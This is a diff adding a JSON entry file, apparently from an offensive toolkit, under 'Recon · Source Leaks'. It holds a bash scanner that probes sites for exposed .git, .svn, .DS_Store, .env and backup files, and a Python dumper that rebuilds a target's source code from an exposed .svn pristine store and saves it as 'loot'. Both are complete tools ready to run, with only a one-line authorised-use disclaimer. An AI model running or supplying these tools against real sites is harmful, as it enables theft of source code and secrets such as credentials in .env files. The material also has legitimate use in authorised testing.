@@ -1,0 +1,42 @@
+{
+  "category": "Recon · Source Leaks",
+  "group": "recon",
+  "catOrder": 33,
+  "entries": [
+    {
+      "title": "Source exposure check (/.git /.svn /.DS_Store /.env)",
+      "lang": "bash",
+      "tags": [
+        "exposure",
+        "git",
+        "svn",
+        "dsstore",
+        "env",
+        "leak"
+      ],
+      "rating": "must",
+      "deps": "curl - no dependencies",
+      "placeholders": "{{URL}} (base, e.g. https://target) or {{HOSTS_FILE}}",
+      "source": "https://owasp.org/www-project-web-security-testing-guide/",
+      "license": "GPL-3.0 (original)",
+      "body": "A quick check for whether **VCS service files and configs** are exposed: `/.git/HEAD`, `/.svn/wc.db`, `/.svn/entries`, `/.DS_Store`, `/.env`, `/.git/config`, backups. For each path it looks at the response code and the presence of a signature in the body (for example, `ref:` in `.git/HEAD`, the SQLite magic in `wc.db`) to weed out false 200s from a custom 404 page. If something is found, you can then dump the sources with the matching tool.\n\n> This is only an indicator. `.git/HEAD` with a body of `ref: refs/heads/...` = the repo is exposed -> grab git-dumper. `.svn/wc.db` (SQLite) = old SVN -> svn_dumper. `.DS_Store` = a macOS file listing -> a dsstore dumper.\n\n```bash\n#!/usr/bin/env bash\n# exposure_check.sh - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nset -uo pipefail\nBASE=\"${1:?usage: exposure_check.sh <https://target | hosts.txt>}\"\nUA=\"ARS3NAL-recon/1.0\"\n\n# path|signature-in-body (empty = a 200 code is enough)\nPATHS=(\n  \".git/HEAD|ref:\"\n  \".git/config|[core]\"\n  \".svn/wc.db|SQLite format\"\n  \".svn/entries|\"\n  \".DS_Store|Bud1\"\n  \".env|=\"\n  \".env.bak|=\"\n  \"config.php.bak|\"\n  \"backup.zip|\"\n)\n\ncheck_one() {\n  local base=\"$1\"\n  base=\"${base%/}\"\n  for item in \"${PATHS[@]}\"; do\n    local path=\"${item%%|*}\" sig=\"${item#*|}\"\n    local url=\"$base/$path\"\n    local resp code body\n    resp=\"$(curl -sS -A \"$UA\" -m 12 -w $'\\n%{http_code}' \"$url\" 2>/dev/null)\" || continue\n    code=\"${resp##*$'\\n'}\"; body=\"${resp%$'\\n'*}\"\n    if [ \"$code\" = \"200\" ]; then\n      if [ -z \"$sig\" ] || printf '%s' \"$body\" | grep -qiF \"$sig\"; then\n        echo \"[FOUND] $url  (HTTP $code)\"\n      fi\n    fi\n  done\n}\n\nif [ -f \"$BASE\" ]; then\n  while read -r h; do [ -n \"$h\" ] && check_one \"$h\"; done < \"$BASE\"\nelse\n  check_one \"$BASE\"\nfi\n```\n\nRun:\n```bash\n./exposure_check.sh https://target.com\n# or for a list of live hosts:\n./exposure_check.sh live_hosts.txt\n```"
+    },
+    {
+      "title": "SVN dumper (extract sources from exposed /.svn/ wc.db)",
+      "lang": "python",
+      "tags": [
+        "svn",
+        "dumper",
+        "source-leak",
+        "wc.db",
+        "pristine"
+      ],
+      "rating": "must",
+      "deps": "pip install requests (sqlite3 in stdlib)",
+      "placeholders": "{{URL}} (target base, e.g. https://target) · {{OUTDIR}}",
+      "source": "https://subversion.apache.org/",
+      "license": "GPL-3.0 (original)",
+      "body": "Recovers sources from an exposed `/.svn/` (SVN 1.7+). The logic: it downloads the `/.svn/wc.db` database (it is SQLite), reads the `NODES` table - it holds a path (`local_relpath`) and a checksum (`checksum`) for each file. The actual content sits in the **pristine store** at `/.svn/pristine/<first 2 chars of the hash>/<full hash>.svn-base`. The script downloads every pristine file and lays them out under their original paths. An original stdlib + requests implementation.\n\n> Works for SVN 1.7+ (single wc.db). The checksum in `NODES` is stored as `$sha1$<hex>` - the pristine file name is taken from it. If pristine returns 404, access to that folder may be disabled on the server, in which case the source cannot be retrieved.\n\n```python\n#!/usr/bin/env python3\n# svn_dumper.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nimport argparse, os, sqlite3, tempfile, requests\nrequests.packages.urllib3.disable_warnings()\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL SVN /.svn/ dumper (1.7+)\")\n    ap.add_argument(\"-u\", \"--url\", required=True, help=\"target base, e.g. https://target\")\n    ap.add_argument(\"-o\", \"--out\", default=\"dumped_svn\")\n    a = ap.parse_args()\n    base = a.url.rstrip(\"/\")\n    s = requests.Session(); s.headers[\"User-Agent\"] = \"ARS3NAL/1.0\"; s.verify = False\n\n    # 1) download wc.db\n    r = s.get(f\"{base}/.svn/wc.db\", timeout=20)\n    if r.status_code != 200 or len(r.content) < 100:\n        print(f\"[-] wc.db not accessible (HTTP {r.status_code})\"); return\n    fd, dbpath = tempfile.mkstemp(suffix=\".db\"); os.close(fd)\n    with open(dbpath, \"wb\") as f:\n        f.write(r.content)\n    print(f\"[*] wc.db downloaded ({len(r.content)} bytes)\")\n\n    # 2) read NODES: path + checksum\n    con = sqlite3.connect(dbpath); cur = con.cursor()\n    cur.execute(\"SELECT local_relpath, checksum FROM NODES WHERE checksum IS NOT NULL\")\n    rows = [(p, c) for p, c in cur.fetchall() if p]\n    con.close(); os.unlink(dbpath)\n    print(f\"[*] {len(rows)} files referenced\")\n\n    # 3) for each, download the pristine .svn-base\n    os.makedirs(a.out, exist_ok=True)\n    got = 0\n    for relpath, checksum in rows:\n        # checksum in $sha1$<40hex> format\n        h = checksum.split(\"$\")[-1]\n        if len(h) < 2:\n            continue\n        pristine = f\"{base}/.svn/pristine/{h[:2]}/{h}.svn-base\"\n        try:\n            pr = s.get(pristine, timeout=20)\n        except requests.RequestException:\n            continue\n        if pr.status_code != 200:\n            continue\n        dest = os.path.join(a.out, relpath.replace(\"\\\\\", \"/\"))\n        os.makedirs(os.path.dirname(dest) or \".\", exist_ok=True)\n        with open(dest, \"wb\") as f:\n            f.write(pr.content)\n        got += 1\n        print(f\"    [+] {relpath}\")\n    print(f\"[=] recovered {got}/{len(rows)} files -> {a.out}/\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun:\n```bash\npython3 svn_dumper.py -u https://target.com -o loot_svn\n```"
+    }
+  ]
+}
